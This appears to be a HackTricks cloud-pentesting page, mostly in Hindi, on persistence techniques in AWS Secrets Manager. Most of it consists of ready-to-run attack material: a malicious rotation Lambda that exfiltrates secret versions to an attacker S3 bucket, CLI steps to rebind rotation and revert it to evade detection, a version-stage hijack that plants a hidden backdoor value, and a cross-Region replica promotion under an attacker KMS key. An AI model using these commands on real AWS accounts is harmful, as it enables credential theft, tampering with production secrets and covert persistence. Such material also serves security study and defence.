# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Resource Policies के माध्यम से

Resource policies के माध्यम से बाहरी खातों को **secrets तक access प्रदान करना** संभव है। अधिक जानकारी के लिए [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) देखें। ध्यान दें कि किसी **secret तक access करने के लिए**, बाहरी खाते को उस secret को encrypt करने वाली **KMS key** तक भी **access की आवश्यकता** होगी।

### Secrets Rotate Lambda के माध्यम से

Secrets को स्वचालित रूप से **rotate** करने के लिए एक configured **Lambda** को कॉल किया जाता है। यदि attacker **change** कर सके तो वह सीधे नया **secret** स्वयं को **exfiltrate** कर सकता है।

This is how lambda code for such action could look like:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}

### RotateSecret के माध्यम से rotation Lambda को attacker-controlled function में बदलें

`secretsmanager:RotateSecret` का दुरुपयोग करके किसी secret को attacker-controlled rotation Lambda से rebind करें और तुरंत rotation ट्रिगर करें। मैलिशियस function rotation के चरणों (createSecret/setSecret/testSecret/finishSecret) के दौरान secret संस्करण (AWSCURRENT/AWSPENDING) को attacker sink (उदा., S3 या external HTTP) पर exfiltrate कर देता है।

- आवश्यकताएँ
- Permissions: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` on the attacker Lambda, `iam:CreateRole/PassRole/PutRolePolicy` (or AttachRolePolicy) to provision the Lambda execution role with `secretsmanager:GetSecretValue` and preferably `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (so rotation keeps working), KMS `kms:Decrypt` for the secret KMS key, and `s3:PutObject` (or outbound egress) for exfiltration.
- A target secret id (`SecretId`) with rotation enabled or the ability to enable rotation.

- प्रभाव
- Attacker legit rotation code को बदले बिना secret value(s) प्राप्त कर लेता है। केवल rotation configuration को attacker Lambda की तरफ पॉइंट किया जाता है। अगर ध्यान न दिया जाए तो scheduled future rotations भी attacker के function को invoke करना जारी रखेंगे।

- Attack steps (CLI)
1) Prepare attacker sink and Lambda role
- Exfiltration के लिए S3 bucket बनाएं और Lambda द्वारा trusted execution role बनाएं जिसमें secret पढ़ने और S3 में लिखने की permissions हों (साथ ही logs/KMS जैसी ज़रूरतें)।
2) Deploy attacker Lambda जो हर rotation step पर secret value(s) fetch करके S3 में लिखे। न्यूनतम rotation logic बस AWSCURRENT को AWSPENDING में copy कर सकता है और finishSecret में उसे promote कर सकता है ताकि service स्वस्थ रहे।
3) Rebind rotation and trigger
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) उस secret के लिए S3 prefix list करके और JSON artifacts inspect करके exfiltration verify करें।
5) (Optional) detection कम करने के लिए original rotation Lambda को restore करें।

- Example attacker Lambda (Python) exfiltrating to S3
- Environment: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Secrets Manager के version staging labels का दुरुपयोग करके एक attacker-controlled secret version स्थापित करें और उसे एक custom stage (उदाहरण के लिए, `ATTACKER`) के तहत छुपा रखें, जबकि production मूल `AWSCURRENT` का उपयोग जारी रखे। किसी भी समय `AWSCURRENT` को attacker के version पर मूव करके dependent workloads को poison करें, फिर detection कम करने के लिए इसे restore करें। इससे secret name या rotation config बदले बिना stealthy backdoor persistence और rapid time-of-use manipulation संभव होता है।

- आवश्यकताएँ
- Permissions: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (for verification)
- Target secret id in the Region.

- प्रभाव
- एक छिपा हुआ, attacker-controlled version बनाए रखें और मांग पर `AWSCURRENT` को उस पर एटोमिक रूप से flip करें, जिससे कोई भी consumer जो समान secret name resolve करता है प्रभावित होगा। फ्लिप और त्वरित revert पता लगाने की संभावना कम करते हैं जबकि time-of-use compromise सक्षम होता है।

- Attack steps (CLI)
- तैयारी
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>CLI commands</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- नोट्स
- जब आप `--client-request-token` प्रदान करते हैं, तो Secrets Manager इसे `VersionId` के रूप में उपयोग करता है। स्पष्ट रूप से `--version-stages` सेट किए बिना एक नया संस्करण जोड़ने से डिफ़ॉल्ट रूप से `AWSCURRENT` नए संस्करण पर चला जाता है, और पिछले संस्करण को `AWSPREVIOUS` के रूप में चिह्नित कर देता है।


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Secrets Manager की multi-Region replication का दुरुपयोग करके target secret की एक replica कम-निगरानी वाले Region में बनाएं, उस Region में attacker-controlled KMS key से उसे encrypt करें, फिर उस replica को standalone secret में promote करें और उस पर permissive resource policy attach कर दें जो attacker को read access दे। प्राथमिक Region में मूल secret अपरिवर्तित रहता है, जिससे promoted replica के माध्यम से secret value तक स्थायी और stealthy पहुंच मिल जाती है जबकि primary पर लगे KMS/policy सीमाओं को बायपास किया जा सकता है।

- आवश्यकताएँ
- Permissions: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- replica Region में: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (या `kms:PutKeyPolicy`) ताकि attacker principal को `kms:Decrypt` की अनुमति दी जा सके।
- एक attacker principal (user/role) जिसे promoted secret का read access दिया जा सके।

- प्रभाव
- attacker-controlled KMS CMK और permissive resource policy के तहत standalone replica के माध्यम से secret value तक स्थायी cross-Region पहुँच। मूल Region में primary secret अप्रभावित रहता है।

- Attack (CLI)
- Vars
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) रिप्लिका Region में हमलावर-नियंत्रित KMS key बनाएँ
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) attacker KMS key का उपयोग करके secret को R2 में replicate करें
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) R2 में रिप्लिका को standalone के रूप में प्रमोट करें
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) R2 में standalone secret पर permissive resource policy लागू करें
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) R2 में attacker principal से secret पढ़ें
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

